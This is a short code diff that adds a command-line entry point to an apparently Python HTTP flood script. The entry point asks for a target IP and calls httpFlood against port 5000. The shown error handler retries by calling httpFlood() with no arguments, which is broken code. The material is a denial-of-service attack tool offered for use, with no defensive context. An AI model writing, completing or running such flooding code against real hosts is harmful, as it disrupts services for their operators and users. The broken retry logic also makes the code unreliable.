@@ -41,3 +41,7 @@ def httpFlood(target, port = 80):
             
     except ConnectionRefusedError:
         httpFlood()
+
+if __name__ == "__main__":
+    target = input("Target IP: ")
+    httpFlood(target, 5000)
